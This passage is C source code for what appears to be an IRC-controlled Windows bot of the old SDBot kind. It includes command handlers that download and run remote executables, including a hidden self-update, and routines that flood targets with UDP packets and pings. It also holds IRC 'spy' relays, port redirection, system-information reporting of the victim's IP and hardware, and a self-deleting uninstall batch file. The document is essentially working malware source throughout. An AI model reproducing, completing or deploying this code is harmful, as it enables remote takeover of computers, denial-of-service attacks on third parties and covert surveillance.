			#ifndef NO_DOWNLOAD
			else if (strcmp("update", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				sprintf(ds.dest, "c:\\%s.exe", nick);
				strcpy(ds.url, a[s+1]);
				ds.run = 0;
				ds.sock = sock;
				strcpy(ds.chan, a[2]);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 1;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "downloading update from %s...\r\n", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf);
			}
			#endif
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				if (atoi(a[s+1]) == 0) sinfo.wShowWindow = SW_HIDE; else sinfo.wShowWindow = SW_SHOW;
				char *x = strstr(line1, " :");
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
				}
			}
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				ircs irc;
				strcpy(irc.host, a[s+1]);
				irc.port = atoi(a[s+2]);
				strcpy(irc.channel, a[s+3]);
				if (a[s+4] != NULL) strcpy(irc.chanpass, a[s+4]);
				sprintf(sendbuf, "clone (%s)", irc.host);
				irc.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "clone created on %s:%d, in channel %s.\r\n", irc.host, irc.port, irc.channel);
				irc_privmsg(sock, a[2], sendbuf);
				threads[irc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&irc, 0, &id);
			}
			else if (a[s+3] == NULL) return 1;
			#ifndef NO_DOWNLOAD
			else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				ds ds;
				strcpy(ds.url, a[s+1]);
				strcpy(ds.dest, a[s+2]);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strcpy(ds.chan, a[2]);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 0;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "downloading %s...\r\n", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf);
			}
			#endif
			#ifndef NO_UDP
			else if (strcmp("udp", a[s]) == 0 || strcmp("u", a[s]) == 0) {
				ps udps;
				strcpy(udps.host, a[s+1]);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL) udps.port = atoi(a[s+5]); else udps.port = 0;
				strcpy(udps.chan, a[2]);
				udps.sock = sock;
				sprintf(sendbuf, "udp (%s)", udps.host);
				udps.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "sending %d udp packets to: %s. packet size: %d, delay: %d[ms].\r\n", udps.num, udps.host, udps.size, udps.delay);
				irc_privmsg(sock, a[2], sendbuf);
				threads[udps.threadnum] = CreateThread(NULL, 0, &udp, (void *)&udps, 0, &id);
			}
			#endif
			#ifndef NO_PING
			else if (strcmp("ping", a[s]) == 0 || strcmp("p", a[s]) == 0) {
				ps pings;
				strcpy(pings.host, a[s+1]);
				pings.num = atoi(a[s+2]);
				pings.size = atoi(a[s+3]);
				pings.delay = atoi(a[s+4]);
				strcpy(pings.chan, a[2]);
				pings.sock = sock;
				sprintf(sendbuf, "ping (%s)", pings.host);
				pings.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "sending %d pings to %s. packet size: %d, timeout: %d[ms]\r\n", pings.num, pings.host, pings.size, pings.delay);
				irc_privmsg(sock, a[2], sendbuf);
				threads[pings.threadnum] = CreateThread(NULL, 0, &ping, (void *)&pings, 0, &id);
			}
			#endif
			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0') {
					char *x = strstr(line1, " :");
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], y);
						sprintf(sendbuf, "[%s] <%s> %s", a[s+2], cnick[atoi(a[s+1])], y);
						irc_privmsg(sock, a[2], sendbuf);
					}
				}
			}
			else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0') {
					char *x = strstr(line1, " :");
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], sendbuf);
						sprintf(sendbuf, "[%s] * %s %s", a[s+2], cnick[atoi(a[s+1])], y);
						irc_privmsg(sock, a[2], sendbuf);
					}
				}
			}
			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_SPY
			else if (strcmp("spy", a[s]) == 0 || strcmp("sp", a[s]) == 0) {
				ircs sirc;
				strcpy(sirc.host, a[s+2]);
				sirc.port = atoi(a[s+3]);
				strcpy(sirc.channel, a[s+4]);
				if (a[s+5] != NULL) strcpy(sirc.chanpass, a[s+5]);
				strcpy(sirc.hchan, a[2]);
				sirc.sock = sock;
				sirc.spy = 1;
				sprintf(sendbuf, "spy (%s)", sirc.host);
				sirc.threadnum = addthread(sendbuf);
				sirc.nick = cnick[sirc.threadnum];
				strcpy(sirc.nick, a[s+1]);
				sprintf(sendbuf, "spy created on %s:%d, in channel %s.\r\n", sirc.host, sirc.port, sirc.channel);
				irc_privmsg(sock, a[2], sendbuf);
				threads[sirc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&sirc, 0, &id);
			}
			#endif
		}
	}
	return repeat;
 }


#ifndef NO_SPY
// function for spies to parse lines
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server)
 {
	char line1[512];
	char line2[512];
	int i;
	char *a[32];
	char a0[96];
	char nick[16];
	char sendbuf[256];

	strcpy(nick, nick1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	memset(line2, 0, sizeof(line2));
	strcpy(line1, line);
	strcpy(line2, line);

	// split the current line up into seperate words
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[1] == NULL) return 1;
	if (a[0][0] != '\n') strcpy(a0, a[0]);

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);

	else if (strcmp("353", a[1]) == 0) {
		char *m = strstr(line1, a[5]);
		if (m != NULL) {
			sprintf(sendbuf, "[%s]: Users in %s: %s", server, a[4], m+1);
			irc_privmsg(hsock, hchannel, sendbuf);
		}
	}

	else if (strcmp("433", a[1]) == 0) {
		sprintf(sendbuf, "[%s]: nick %s already in use.", server, nick1);
		irc_privmsg(hsock, hchannel, sendbuf);
	}

	else if (strcmp("JOIN", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		sprintf(sendbuf, "[%s]: %s has joined %s.", a[2]+1, u, a[2]+1);
		irc_privmsg(hsock, hchannel, sendbuf);
	}

	else if (strcmp("PART", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		sprintf(sendbuf, "[%s]: %s has left %s.", a[2], u, a[2]);
		irc_privmsg(hsock, hchannel, sendbuf);
	}

	else if (strcmp("KICK", a[1]) == 0) {
		if (strcmp(nick, a[3]) == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			sprintf(sendbuf, "wtf %s?\r\n", strtok(a[0], "!") + 1);
			irc_privmsg(sock, a[2], sendbuf);
		}
	}

	else if (strcmp("QUIT", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		char *q = strstr(line2, " :") + 2;
		sprintf(sendbuf, "[%s]: %s has quit(%s).", server, u, q);
		irc_privmsg(hsock, hchannel, sendbuf);
	}

	else if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = strtok(a[0], "!") + 1;
		char *newnck = a[2] + 1;
		if (oldnck != NULL && newnck != NULL) if (strcmp(oldnck, nick1) == 0) strcpy(nick1, newnck);
		sprintf(sendbuf, "[%s]: %s is now known as %s.", server, oldnck, newnck);
		irc_privmsg(hsock, hchannel, sendbuf);
	}

	else if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {
		if (strstr(a[2], "#") == NULL) a[2] = strtok(a[0], "!") + 1;
		a[3]++;
		char *u = strtok(a[0], "!") + 1;
		if (strcmp("\1ACTION", a[3]) == 0) {
			char *m = strstr(line1, "ACTION");
			if (m != NULL) {
				m = m + 7;
				sprintf(sendbuf, "[%s]: * %s %s", a[2], u, strtok(m, "\1"));
				irc_privmsg(hsock, hchannel, sendbuf);
			}
		}
		else {
			char *m = strstr(line1, " :");
			if (m != NULL) {
				m = m + 2;
				sprintf(sendbuf, "[%s]: <%s> %s", a[2], u, m);
				irc_privmsg(hsock, hchannel, sendbuf);
			}
		}
	}

	return 1;
}
#endif

// irc send functions
 void irc_send(SOCKET sock, char *msg)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }


 void irc_sendf(SOCKET sock, char *msg, char *str)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_privmsg(SOCKET sock, char *dest, char *msg)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "PRIVMSG %s :%s\r\n", dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

// search-and-replace function for strings
 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[384];
	char str3[384];
	char str4[384];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strcpy(str2, str);

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strcpy(str4, p + strlen(oldstr));
		p[0] = '\0';
		strcpy(str3, str2);
		if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strcpy(str, str2);
	return str;
 }

 #ifndef NO_UDP
// function for sending udp packets
 DWORD WINAPI udp(LPVOID param)
 {
	SOCKET usock;
	SOCKADDR_IN ssin;
	LPHOSTENT hostent;
	IN_ADDR iaddr;
	ps udp;
	int i;

	// socket setup
	udp = *((ps *)param);
	char *host = udp.host;
	hostent = gethostbyname(udp.host);
	usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	iaddr.s_addr = inet_addr(udp.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(udp.host);
	else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
	if (hostent == NULL) {
		irc_sendf2(udp.sock, "PRIVMSG %s :error sending packets to %s.\r\n", udp.chan, host);
		return 0;
	}
	ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	srand(GetTickCount());
	if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1); else ssin.sin_port = htons(udp.port); // get a random port if one isn't specified

	udp.num = udp.num / 10;

	char *ubuff = (char *)malloc(udp.size);
	while (udp.num-- > 0) {
		//change port every 10 packets (if one isn't specified)
		for (i = 0; i < 11; i++) {
			sendto(usock, ubuff, udp.size-(rand() % 20), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1);
	}
	free(ubuff);
	irc_sendf2(udp.sock, "PRIVMSG %s :finished sending packets to %s.\r\n", udp.chan, host);

	threads[udp.threadnum] = 0;
	threadd[udp.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_PING
//  function for sending pings
 DWORD WINAPI ping(LPVOID param)
 {
	char cmdline[256];
	DWORD exitcode;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ps ping;
	int i;

	ping = *((ps *)param);
	char *host = ping.host;

	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb = sizeof(sinfo);
	sinfo.wShowWindow = SW_HIDE;

	memset(cmdline, 0, sizeof(cmdline));
	sprintf(cmdline, "ping.exe -l %d -n %d -w %d %s", ping.size, 20, ping.delay, ping.host); // build our command line

	// send the pings in groups of 20
	for (i = 0; i < ping.num / 20; i++) {
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);

		// wait for ping.exe process to finish
		WaitForSingleObject(pinfo.hProcess, -1);
		GetExitCodeProcess(pinfo.hProcess, &exitcode);
		CloseHandle(pinfo.hProcess);
	}

	irc_sendf2(ping.sock, "PRIVMSG %s :finished sending packets to %s.\r\n", ping.chan, host);

	threads[ping.threadnum] = 0;
	threadd[ping.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_DOWNLOAD
// function for downloading files/updating
 DWORD WINAPI webdownload(LPVOID param)
 {
	char fbuff[512];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ds dl;
	dl = *((ds *)param);
	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			irc_sendf2(dl.sock, "PRIVMSG %s :couldn't open %s.\r\n", dl.chan, dl.dest);
			threads[dl.threadnum] = 0;
			threadd[dl.threadnum][0] = '\0';
			return 0;
		}

		total = 1;
		start = GetTickCount();

		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
			total = total + r;
			if (dl.update != 1) sprintf(threadd[dl.threadnum], "file download (%s - %dkb transferred)", dl.url, total / 1024);
			 else sprintf(threadd[dl.threadnum], "update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		speed = total / (((GetTickCount() - start) / 1000) + 1);

		CloseHandle(f);

		//download isn't an update
		if (dl.update != 1) {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			irc_privmsg(dl.sock, dl.chan, tstr);

			if (dl.run == 1) {
				ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				irc_sendf2(dl.sock, "PRIVMSG %s :opened %s.\r\n", dl.chan, dl.dest);
			}

		// download is an update
		} else {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec. updating...", total / 1024.0, dl.dest, speed / 1024.0);
			irc_privmsg(dl.sock, dl.chan, tstr);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				WSACleanup();
				exit(0);
			} else {
				irc_privmsg(dl.sock, dl.chan, "update failed: error executing file.");
			}
		}
	} else irc_privmsg(dl.sock, dl.chan, "bad url, or dns error.");

	InternetCloseHandle(fh);

	threads[dl.threadnum] = 0;
	threadd[dl.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_REDIRECT
// port redirect function
 DWORD WINAPI redirect(LPVOID param)
 {
	SOCKET rsock, csock;
	SOCKADDR_IN rssin, cssin;
	rs rs2;
	DWORD id;

	rs2 = *((rs *)param);
	rsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	WSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	memset(&rssin, 0, sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = htons(rs2.lport);
	bind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	while(1) {
		if (listen(rsock, 10) == SOCKET_ERROR) break;
		csock = accept(rsock, (SOCKADDR *)&cssin, NULL);
		if (csock != INVALID_SOCKET) {
			rs2.csock = csock;
			CreateThread(NULL, 0, &redirectloop, (void *)&rs2, 0, &id);
		}
	}

	closesocket(csock);
	closesocket(rsock);

	return 0;
 }

// part of the redirect function, handles sending/recieving for the remote connection.
 DWORD WINAPI redirectloop(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	char *dest;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int port, err;
	char buff[4096];
	rs rs2;
	rs2 = *((rs *)param);
	csock = rs2.csock;
	dest = rs2.dest;
	port = rs2.port;
	DWORD id;

	while (1) {
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(port);
		iaddr.s_addr = inet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(dest);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) break;

		rs2.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&rs2, 0, &id);

		while (1) {
			memset(buff, 0, sizeof(buff));
			err = recv(csock, buff, sizeof(buff), 0);
			if (err == 0) {
				break;
			}
			if (err == SOCKET_ERROR) break;

			err = send(sock, buff, strlen(buff), 0);
			if (err == SOCKET_ERROR) break;

		}

		break;
	}

	closesocket(csock);
	closesocket(sock);

	return 0;
 }

// part of the redirect function, handles sending/recieving for the local connection.
 DWORD WINAPI redirectloop2(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	rs rs2;
	int err;
	char buff[4096];
	rs2 = *((rs *)param);
	sock = rs2.sock;
	csock = rs2.csock;

	while (1) {
		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		if (err == 0) {
			break;
		}
		if (err == SOCKET_ERROR) break;
		err = send(csock, buff, strlen(buff), 0);
		if (err == SOCKET_ERROR) break;
	}

	closesocket(csock);
	return 0;
 }
 #endif

 #ifndef NO_SYSINFO
// function used for sysinfo
 char * sysinfo(char *sinfo, SOCKET sock)
 {
	int total;
	DWORD n = 0;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	char ctype[8];
	char cname[128];

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) os = "Windows 95";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "Windows 98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "Windows ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "Windows 2000";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "Windows XP";
	else os = "Win??";
	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	memset(cname, 0, sizeof(cname));
#ifndef _MSC_VER
	InternetGetConnectedStateEx(&n, cname, sizeof(cname), 0);
#endif
    if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strcpy(ctype, "dial-up");
	 else strcpy(ctype, "LAN");

 	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(sinfo, "cpu: %dMHz. ram: %dKB total, %dKB free. os: %s (%d.%d, build %d). uptime: %dd %dh %dm. connection type: %s (%s). IP Address: %d.%d.%d.%d",
		cpuspeed(), memstat.dwTotalPhys / 1024, memstat.dwAvailPhys / 1024,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60,
		ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	return sinfo; // return the sysinfo string
 }

// cpu speed function
 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 unsigned __int64 cyclecount(void)
{
	#ifdef __LCC__ // if we're compiling with lcc, we need to use special code
		unsigned __int64 count = 0;

		_asm ("rdtsc\n"
			  "mov %eax,%count\n");

		return count;
	#else
		_asm {
			_emit 0x0F;
			_emit 0x31;
		}
	#endif
}
#endif

// function for removing the bot's registry entries and executable
 void uninstall(void)
 {
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char cfilename[256];

	// remove our registry entries
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, keyname, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegDeleteValue(key, valuename);
	RegCloseKey(key);

	f = CreateFile("c:\\r.bat", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n:start\r\nif not exist \"\"%1\"\" goto done\r\ndel /F \"\"%1\"\"\r\ngoto start\r\n:done\r\ndel /F c:\\r.bat\r\n", 101, &r, NULL);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
		sprintf(cmdline, "cmd /c c:\\r.bat %s", cfilename);
		// execute the batch file
		if (CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == FALSE) {
			// we must be running on win9x, so we need to use 'command' instead of 'cmd'
			sprintf(cmdline, "command /c c:\\r.bat %s", cfilename);
			CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
		}
	}
 }
